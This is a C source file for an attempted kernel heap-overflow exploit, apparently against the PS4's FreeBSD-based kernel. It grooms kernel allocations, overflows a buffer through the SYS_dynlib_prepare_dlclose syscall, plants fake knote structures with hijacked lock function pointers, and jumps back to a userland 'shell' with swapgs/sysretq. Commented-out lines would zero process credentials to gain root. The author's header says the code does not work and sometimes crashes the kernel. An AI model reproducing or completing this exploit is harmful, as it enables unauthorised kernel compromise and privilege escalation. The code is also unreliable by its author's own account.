/*
	This does not work, and currently seems to only crash the kernel at times
	(depending on the values chosen)
	I have tried, but not gotten further. Either very close or not at all ... Oo
	(if you figure this out please holla - to discuss you can open an issue)
*/

#include "common.h"
#include "alloc.h"
#include "util.h"

/*
struct knote;
SLIST_HEAD(klist, knote);
struct kqueue;
TAILQ_HEAD(kqlist, kqueue);
struct knlist {
	struct	klist	kl_list;
	void    (*kl_lock)(void *);
	void    (*kl_unlock)(void *);
	void	(*kl_assert_locked)(void *);
	void	(*kl_assert_unlocked)(void *);
	void *kl_lockarg;
};
*/

typedef	__int64_t	sbintime_t;

struct knote {
	SLIST_ENTRY(knote)	kn_link;	/* for kq */
	SLIST_ENTRY(knote)	kn_selnext;	/* for struct selinfo */
	struct			knlist *kn_knlist;	/* f_attach populated */
	TAILQ_ENTRY(knote)	kn_tqe;
	struct			kqueue *kn_kq;	/* which queue we are on */
	struct 			kevent kn_kevent;
	int			kn_status;	/* protected by kq lock */
#define KN_ACTIVE	0x01			/* event has been triggered */
#define KN_QUEUED	0x02			/* event is on queue */
#define KN_DISABLED	0x04			/* event is disabled */
#define KN_DETACHED	0x08			/* knote is detached */
#define KN_INFLUX	0x10			/* knote is in flux */
#define KN_MARKER	0x20			/* ignore this knote */
#define KN_KQUEUE	0x40			/* this knote belongs to a kq */
#define KN_HASKQLOCK	0x80			/* for _inevent */
#define	KN_SCAN		0x100			/* flux set in kqueue_scan() */
	int			kn_sfflags;	/* saved filter flags */
	intptr_t		kn_sdata;	/* saved data field */
	union {
		struct		file *p_fp;	/* file data pointer */
		struct		proc *p_proc;	/* proc pointer */
		struct		aiocblist *p_aio;	/* AIO job pointer */
		struct		aioliojob *p_lio;	/* LIO job pointer */
		sbintime_t	*p_nexttime;	/* next timer event fires at */
		void		*p_v;		/* generic other pointer */
	} kn_ptr;
	struct			filterops *kn_fop;
	void			*kn_hook;
	int			kn_hookid;

#define kn_id		kn_kevent.ident
#define kn_filter	kn_kevent.filter
#define kn_flags	kn_kevent.flags
#define kn_fflags	kn_kevent.fflags
#define kn_data		kn_kevent.data
#define kn_fp		kn_ptr.p_fp
};

// Some good to go stack sizes
#define KExecChunkMax 0x100

// Chunk size controls
#define KExecIntermediateChunkSize 0x8000
#define KExecBufferChunkSize 0x8000
#define KExecOverflowChunkSize 0x8000

// Chunk count control
#define KExecIntermediateChuckCount 100

// Shell signature
typedef void (*Runnable)(void *);

// Arbitrary kernel function signatures
typedef int (*PrintF)(const char *fmt, ...);
typedef int (*SysWrite)(struct thread *, struct write_args *);
typedef int	(*SysSendto)(struct thread *, struct sendto_args *);
typedef int	(*Reboot)(struct thread *, struct reboot_args *);

#ifdef __PS4__
#include <kernel.h>

__typeof__(__mb_sb_limit) __mb_sb_limit;
__typeof__(__mb_sb_limit) *__mb_sb_limit_address;
__typeof__(_CurrentRuneLocale) _CurrentRuneLocale;
__typeof__(_CurrentRuneLocale) *_CurrentRuneLocale_address;
__typeof__(__stdinp) __stdinp;
__typeof__(__stdinp) *__stdinp_address;
__typeof__(__stdoutp) __stdoutp;
__typeof__(__stdoutp) *__stdoutp_address;
__typeof__(__isthreaded) __isthreaded;
__typeof__(__isthreaded) *__isthreaded_address;
#endif

static int debug;

void shell()
{
	printf("shell");
	fflush(stdout);
}

void run(void *arg) // no idea if this user land function is (can?) ever been called by the kernel
{
	struct thread *td;
	//struct ucred *cred;

	struct sendto_args sargs;
	struct write_args wargs;

 	sargs.s = debug;
	sargs.buf = (void *)0xffffffff8247b0f0;
	sargs.len = 0x1000;
 	sargs.flags = 0;
	sargs.to = NULL;
	sargs.tolen = 0;

	wargs.fd = 1;
	wargs.buf = (void *)0xffffffff8247b0f0;
	wargs.nbyte = 0x1000;

	__asm__ volatile("movq %%gs:0, %0" : "=r"(td)); // should be, no?

/*
	cred = td->td_proc->p_ucred;
	cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	//cred->cr_prison = ; // no good idea to get prison0 either
*/

	while(((SysWrite)0xffffffff8247b0f0)(td, &wargs) == EINTR);
	while(((SysSendto)0xffffffff8249eba0)(td, &sargs) == EINTR);

	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
}

void dummy(void *arg)
{
	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
}

/*
	__asm__ volatile("swapgs;");
	printf("bar");
	fflush(stdout);
	while(1){};
	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
*/

void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t bufferSize, size_t overflowSize)
{
	int chunks[KExecChunkMax];
	int bufferChunk;
	int overflowChunk;
	uint8_t *map;
	long pageSize = sysconf(_SC_PAGESIZE);
	size_t mapChunkSize = (bufferSize + overflowSize);
	size_t mapOverflowSize = (0x100000000 + bufferSize) / 4;
	struct klist *kist;
	int i, r;
	int fd = KExecChunkSizeCalulate(intermediateSize);
	struct knote kote = {0};
	struct knlist knist = {0};

/*
	struct knote *kote;
	struct knlist *knist;
	kote = malloc(0x80000); //0x1000 * sizeof(struct knote));
	memset(kote, '\0', 0x80000); //0x1000 * sizeof(struct knote));
	knist = malloc(0x80000); //0x1000 * sizeof(struct knlist));
	memset(knist, '\0', 0x80000); // 0x1000 * sizeof(struct knlist));
*/

	// setup kernel chunks
	for(i = 0; i < intermediateChunkCount; i++)
		chunks[i] = kexecAlloc(intermediateSize);
	// note errors
	for(i = 0; i < intermediateChunkCount; i++)
		if(chunks[i] < 0)
			printf("kexecAlloc: %i failed with %i\n", i, chunks[i]);

	bufferChunk = kexecAlloc(bufferSize);
	if(bufferChunk < 0)
		printf("bufferChunk: failed with %i\n", bufferChunk);

	overflowChunk = kexecAlloc(overflowSize);
	if(overflowChunk < 0)
		printf("overflowChunk: failed with %i\n", overflowChunk);

	// free first
	r = kexecFree(bufferChunk);
	if(r < 0)
		printf("kexecFree(bufferChunk) = %i\n", r);

	// setup userland
	map = mmap(NULL, mapChunkSize + pageSize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

	if(map == MAP_FAILED)
	{
		for(i = 0; i < intermediateChunkCount; i++)
		{
			r = kexecFree(chunks[i]);
			if(r < 0)
				printf("kexecFree(chunks[%i]) = %i\n", i, r);
		}
		r = kexecFree(overflowChunk);
		if(r < 0)
			printf("kexecFree(overflowChunk) = %i\n", r);
		printf("mmap failed\n");
		return;
	}

	munmap(map + mapChunkSize, pageSize);

/*
	i = 0;
	for(kist = (struct klist *)(map + bufferSize); kist < (struct klist *)(map + bufferSize + overflowSize); ++kist)
	{
		knist[i].kl_list.slh_first = NULL;
		knist[i].kl_lock = dummy;
		knist[i].kl_unlock = knist[i].kl_assert_locked = knist[i].kl_assert_unlocked = dummy;
		knist[i].kl_lockarg = NULL;
		kote[i].kn_knlist = &knist[i];
		kist->slh_first = &kote[i];
		++i;
	}
	printf("set %i knotes and knlists\n", i);
*/

	knist.kl_list.slh_first = &kote;

	knist.kl_lock = dummy;
	knist.kl_unlock = knist.kl_assert_locked = knist.kl_assert_unlocked = dummy;
	knist.kl_lockarg = NULL;

	kote.kn_knlist = &knist;
	kote.kn_link.sle_next = kote.kn_selnext.sle_next = NULL; //&kote;
	kote.kn_kevent.ident = fd;

printf("%zu\n", sizeof(struct klist));

	kist = (struct klist *)(map + bufferSize);
	for(i = 0; i < overflowSize / sizeof(struct klist); ++i)
		kist[i].slh_first = &kote;
	//kist[fd].slh_first = &kote;

	// overflow
	r = syscall(SYS_dynlib_prepare_dlclose, 1, map, &mapOverflowSize);
	printf("SYS_dynlib_prepare_dlclose: %i\n", r);

	printf("wait ... ");
	sleep(10);
	printf("go\n");
	fflush(stdout);

	// free all intermediates - unless global fd - nothing happens here
	for(i = 0; i < intermediateChunkCount; i++)
	{
		printf("freeing: %i\n", i);
		fflush(stdout);
		r = kexecFree(chunks[i]);
		if(r < 0)
			printf("kexecFree(chunks[%i]) = %i\n", i, r);
	}

	printf("wait ... ");
	sleep(0);
	printf("go\n");
	fflush(stdout);

	printf("Pre Trigger\n");
	fflush(stdout);
	// trigger + free
	r = kexecFree(overflowChunk);
	if(r < 0)
		printf("kexecFree(overflowChunk) = %i\n", r);
	printf("Post Trigger\n");
	fflush(stdout);

	munmap(map, bufferSize); // mapChunkSize - overflowSize

	// close fd for unclosed global allocs
	r = kexecCloseGlobalIfNeeded();
	if(r < 0)
		printf("kexecCloseGlobalIfNeeded() = %i\n", r);
}

int main(int argc, char **argv)
{
	#ifdef __PS4__
	int libc = sceKernelLoadStartModule("libSceLibcInternal.sprx", 0, NULL, 0, 0, 0);
	sceKernelDlsym(libc, "__stdoutp", (void **)&__stdoutp_address);
	__stdoutp = *__stdoutp_address;
	sceKernelDlsym(libc, "__mb_sb_limit", (void **)&__mb_sb_limit_address);
	__mb_sb_limit = *__mb_sb_limit_address;
	sceKernelDlsym(libc, "_CurrentRuneLocale", (void **)&_CurrentRuneLocale_address);
	_CurrentRuneLocale = *_CurrentRuneLocale_address;
	#endif

	debug = utilSingleAcceptServer(5088);

	kexecExploit(KExecIntermediateChuckCount, KExecIntermediateChunkSize, KExecBufferChunkSize, KExecOverflowChunkSize);

	while(1);

	close(debug);

	return EXIT_SUCCESS;
}
